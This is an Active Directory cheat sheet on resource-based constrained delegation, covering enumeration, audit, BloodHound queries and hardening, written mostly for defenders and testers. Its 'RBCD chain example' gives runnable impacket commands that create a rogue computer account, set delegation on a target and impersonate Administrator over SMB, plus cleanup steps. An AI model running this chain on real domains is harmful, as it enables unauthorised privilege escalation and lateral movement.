---
aliases:
  - RBCD
  - Resource-Based Constrained Delegation
  - msDS-AllowedToActOnBehalfOfOtherIdentity
  - PrincipalsAllowedToDelegateToAccount
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
  - "[[Resource-Based Constrained Delegation (RBCD)]]"
---
# AD - Delegation Enumeration - Resource-Based Constrained Delegation (RBCD)

***

## Concept Overview

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| RBCD = Resource-Based Constrained Delegation | Modern Kerberos delegation | Standard. |
| Inverse direction of classic CD | Target controls who delegates | Standard. |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | Attribute on TARGET object | LDAP. |
| Stored on target (resource) side | Standard | Standard. |
| Atacante writes to msDS-AllowedToActOnBehalfOfOtherIdentity → impersonate any user to target | Standard chain | Critical. |
| Required: WriteProperty on target | ACL combo | Standard. |
| Computer with `ms-DS-MachineAccountQuota` > 0 | User can create computer | Default 10. |
| Default ms-DS-MachineAccountQuota = 10 | Authenticated Users can create | Standard. |
| RBCD chain: create computer → set RBCD → impersonate | Standard | Standard. |
| Modern Microsoft preferred over CD | Hardening | Standard. |
| Per-resource granular | Standard | Standard. |
| Detection: RBCD changes | Defender | Adjacent. |
| Adjacent: RBCD hub | Cross-ref | Adjacent. |
| Compliance: documented baseline | Standard | Adjacent. |
| BloodHound `AddAllowedToAct` edge | Modern | Tool. |
| Modern: extreme caution with quota | Hardening | Standard. |
^ad-rbcd-concept

### RBCD discovery

```bash
# Computers with RBCD configured
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" \
  cn dNSHostName msDS-AllowedToActOnBehalfOfOtherIdentity
```

```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'} |
  Select Name,DNSHostName
```

___

## RBCD vs Classic CD

| **Aspect** | **Classic CD** | **RBCD** |
|:---:|:---:|:---:|
| Attribute | `msDS-AllowedToDelegateTo` (source) | `msDS-AllowedToActOnBehalfOfOtherIdentity` (target) |
| Direction | Source-side | Target-side |
| Configured by | Domain Admin | Resource owner (delegated) |
| Granularity | Per-target SPN | Per-source principal |
| Modern Microsoft preferred | Legacy | Standard. |
| Cross-domain support | Limited | Better. |
| Cross-forest support | Pre-2019 yes; post-2019 no | Standard. |
| Protocol transition | Optional | Always supported. |
| Default ms-DS-MachineAccountQuota | N/A | 10 (allows abuse). |
| Atacante creates computer | Adjacent | Standard chain. |
| BloodHound edges | `AllowedToDelegate` | `AddAllowedToAct` + `AllowedToAct` |
| Per-resource configurable by non-DA | Standard | Hardening. |
| Modern: RBCD over CD | Standard | Hardening. |
| Detection: more events with RBCD | Standard | Defender. |
| Compliance: documented per-resource | Standard | Adjacent. |
| Audit: per-quarter RBCD review | Standard | Compliance. |
| Cross-correlate with priv tier | Standard | Audit. |
^ad-rbcd-vs-cd

### Comparison query

```powershell
# All delegation modes
$cdComputers = Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
$rbcdComputers = Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'}

Write-Host "Classic CD: $($cdComputers.Count) computers"
Write-Host "RBCD: $($rbcdComputers.Count) computers"
```

___

## ms-DS-MachineAccountQuota Default

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `ms-DS-MachineAccountQuota` | Per-user computer creation quota | Domain root attr. |
| Default value: 10 | Authenticated Users can create 10 computers | Critical default. |
| Set on domain root object | Single setting | Standard. |
| Authenticated Users implicit grant | Standard | Permissive. |
| Atacante: create computer → set RBCD on target → impersonate | Standard chain | Critical. |
| Modern: should be set to 0 | Hardening | Standard. |
| `Get-ADDomain | Select MachineAccountQuota` | Adjacent | Edge. |
| LDAP attribute on domain root | Direct | Standard. |
| Per-OU different quota | Edge | Edge. |
| `Set-ADDomain -MachineAccountQuota 0` | Hardening | Privileged. |
| Detection: quota changes | Defender | Adjacent. |
| BloodHound: implicit creation rights | Adjacent | Tool. |
| Cross-correlate with RBCD attacks | Standard | Audit. |
| Compliance: quota = 0 | Best practice | Standard. |
| Audit: per-quarter quota check | Standard | Compliance. |
| Modern: extreme audit critical | Best practice | Standard. |
^ad-rbcd-quota

### Quota check + hardening

```powershell
# Read quota
Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota |
  Select -ExpandProperty ms-DS-MachineAccountQuota

# Default = 10 (allows RBCD abuse)
# Hardening = 0 (block creation)

# Set to 0 (privileged)
Set-ADDomain -Identity dom.local -Replace @{"ms-DS-MachineAccountQuota"=0}
```

___

## RBCD Attack Chain

| **Step** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| 1. Verify target has WriteProperty on RBCD attr | ACL audit | Standard. |
| 2. Create new computer (using quota) | `Add-MachineAccount` or `impacket-addcomputer` | Standard. |
| 3. Set RBCD on target via msDS-AllowedToActOnBehalfOfOtherIdentity | LDAP write | Standard. |
| 4. S4U2Self + S4U2Proxy from new computer | Rubeus / impacket-getST | Standard. |
| 5. Impersonate Administrator to target SPN | Standard | Critical. |
| `addcomputer.py 'dom/user:pass'` | Linux | Standard. |
| `ms-DS-MachineAccountQuota` <= 0 = blocked | Hardening | Standard. |
| Modern Microsoft AD (Server 2022+) | Default 10 still | Standard. |
| Detection: bulk computer creates | Defender | Adjacent. |
| Cleanup: remove created computer | Standard | OPSEC. |
| Adjacent: RBCD hub | Cross-ref | Adjacent. |
| Audit: ACL on target objects | Standard | Audit. |
| Cross-correlate priv target | Standard | Audit. |
| Modern: extreme alerting | Best practice | Standard. |
| Compliance: quota = 0 | Standard | Adjacent. |
| OPSEC: stealth via existing computer | Edge | OPSEC. |
^ad-rbcd-chain

### RBCD chain example

```bash
# Step 1: Create computer using ms-DS-MachineAccountQuota
impacket-addcomputer 'dom.local/user:pass' \
  -computer-name 'EVIL$' -computer-pass 'EvilPass123!'

# Step 2: Configure RBCD on target
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET-COMP$' \
  -dc-ip DC -action write 'dom.local/user:pass'

# Step 3: S4U2Proxy (impersonate Administrator)
impacket-getST -spn 'cifs/target-comp.dom.local' \
  -impersonate Administrator \
  'dom.local/EVIL$:EvilPass123!'

# Step 4: Use TGS for SMB
KRB5CCNAME=Administrator@cifs_target-comp.dom.local@DOM.LOCAL.ccache \
  impacket-smbclient -k -no-pass target-comp.dom.local

# Cleanup
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET-COMP$' \
  -dc-ip DC -action remove 'dom.local/user:pass'
```

___

## RBCD ACL Audit

| **ACE** | **Effect** | **Notas** |
|:---:|:---:|:---:|
| GenericAll on computer | Includes WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity | Standard. |
| GenericWrite on computer | Same | Standard. |
| WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity | Granular RBCD | Specific. |
| WriteDACL on computer | Self-grant | Adjacent. |
| WriteOwner on computer | 2-step | Adjacent. |
| BloodHound `AddAllowedToAct` edge | Direct edge | Modern. |
| Per-target ACL | Granular | Standard. |
| Cross-correlate with quota = 10 | Combined risk | Critical. |
| Audit: ACL on Tier 0 computers | Standard | Audit. |
| Detection: msDS-AllowedToActOnBehalfOfOtherIdentity write | Defender | Adjacent. |
| Modern: minimal write rights | Hardening | Standard. |
| Stale ACL on RBCD-enabled | Audit | Standard. |
| Per-quarter audit | Standard | Compliance. |
| BloodHound continuous | Modern | Tool. |
| Compliance: documented baseline | Standard | Adjacent. |
| Adjacent: ACL Enumeration hub | Cross-ref | Adjacent. |
^ad-rbcd-acl

### RBCD ACL audit

```powershell
# Computers with WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity
Get-ADComputer -Filter * | ForEach-Object {
  $dn = $_.DistinguishedName
  $acl = Get-Acl "AD:$dn"
  
  $rbcdWrite = $acl.Access | Where {
    $_.AccessControlType -eq "Allow" -and
    ($_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite") -and
    $_.IdentityReference.Value -notmatch "Domain Admins|Enterprise Admins|Administrators|SYSTEM|BUILTIN|Self"
  }
  
  if ($rbcdWrite) {
    [PSCustomObject]@{
      Computer = $_.Name
      WriteRBCDPrincipals = ($rbcdWrite.IdentityReference | Sort -Unique) -join '; '
    }
  }
}
```

___

## BloodHound RBCD Edges

| **Edge** | **Significado** | **Notas** |
|:---:|:---:|:---:|
| `AddAllowedToAct` | Atacante can configure RBCD on target | Modern. |
| `AllowedToAct` | RBCD already configured | Standard. |
| `WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity` | Granular | Standard. |
| Cypher: find RBCD paths | Standard | Tool. |
| BloodHound CE 5.x+ RBCD support | Modern | Tool. |
| Visual graph | Per-edge | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| BHCE 6.x improved | Modern | Tool. |
| Custom analytics | Cypher | Tool. |
| Pre-built RBCD queries | Standard | Tool. |
| Cross-correlate priv | Standard | Tool. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern: continuous BHCE | Defender | Standard. |
| Compliance: RBCD baseline | Standard | Adjacent. |
| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
| Modern: extreme audit | Best practice | Standard. |
^ad-rbcd-bh

### BloodHound RBCD queries

```cypher
// All RBCD relationships
MATCH (src)-[:AllowedToAct]->(target)
RETURN src.name, target.name

// Atacante can configure RBCD on target
MATCH (src)-[:AddAllowedToAct]->(target)
RETURN src.name, target.name

// Owned principal can RBCD-attack high-value
MATCH (u {owned: true})-[:AddAllowedToAct]->(target {highvalue: true})
RETURN u.name, target.name

// Path: owned → quota abuse → RBCD → priv impersonation
MATCH (u {owned: true})-[:AddAllowedToAct*1..]->(target)
WHERE target.adminCount = true OR target.name CONTAINS "DC"
RETURN u.name, target.name
```

___

## Cross-Trust RBCD

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Cross-domain RBCD (intra-forest) | Standard | Adjacent. |
| Cross-forest RBCD (post-2019 limited) | Edge | Adjacent. |
| Foreign principal as RBCD source | Cross-trust | Critical. |
| ms-DS-MachineAccountQuota cross-domain | Per-domain | Standard. |
| Cross-trust quota = 10 | Standard | Audit. |
| Detection: cross-trust RBCD changes | Defender | Adjacent. |
| Modern: post-2019 patches | Standard | Adjacent. |
| Adjacent: Trust Abuse hub | Cross-ref | Adjacent. |
| Audit: cross-trust RBCD | Standard | Compliance. |
| Compliance: documented cross-trust | Standard | Adjacent. |
| Cleanup: revert cross-trust RBCD | Standard | OPSEC. |
| Modern: Selective Auth defense | Hardening | Standard. |
| Cross-correlate FSP | Standard | Audit. |
| TGT delegation cross-forest disabled default | Modern | Standard. |
| BloodHound foreign RBCD paths | Modern | Tool. |
| Cypher: cross-trust RBCD queries | Custom | Tool. |
^ad-rbcd-crosstrust

### Cross-trust RBCD detection

```powershell
$localDomain = (Get-ADDomain).Name

Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'} |
  ForEach-Object {
    # Decode SDDL to find principals
    $sd = $_.'msDS-AllowedToActOnBehalfOfOtherIdentity'
    # Use bloodyAD or PowerShell .NET to decode SDDL
    # Filter for foreign domain SIDs
  }
```

___

## Mitigations

| **Mitigation** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| `ms-DS-MachineAccountQuota = 0` | Block computer creation | Critical hardening. |
| Per-OU computer creation delegation | Granular | Standard. |
| Strict ACL on Tier 0 computers | No WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity | Standard. |
| Add Tier 0 to Protected Users | Defender | Standard. |
| `Account is sensitive` UAC | Tier 0 | Standard. |
| Detection: msDS-AllowedToActOnBehalfOfOtherIdentity changes | Defender | Adjacent. |
| Microsoft Defender for Identity RBCD alerts | Modern | Defender. |
| BloodHound continuous RBCD audit | Modern | Tool. |
| Per-quarter RBCD review | Standard | Compliance. |
| AES-only Kerberos | Hardening | Standard. |
| Audit log retention | Standard | Adjacent. |
| Compliance: quota = 0 mandatory | Best practice | Standard. |
| Modern: extreme alerting | Critical | Standard. |
| Cleanup: stale RBCD | Hygiene | Standard. |
| Cross-correlate with priv tier | Standard | Audit. |
| Modern: documented per-RBCD justification | Standard | Adjacent. |
^ad-rbcd-mitigations

### Hardening commands

```powershell
# Disable computer creation (CRITICAL hardening)
Set-ADDomain -Identity dom.local -Replace @{"ms-DS-MachineAccountQuota"=0}

# Verify
(Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'

# Add Tier 0 to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "DA-User1","DA-User2"

# Audit + remove stale RBCD
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'} |
  ForEach-Object {
    Write-Host "RBCD configured on $($_.Name) — verify justification"
  }
```

***
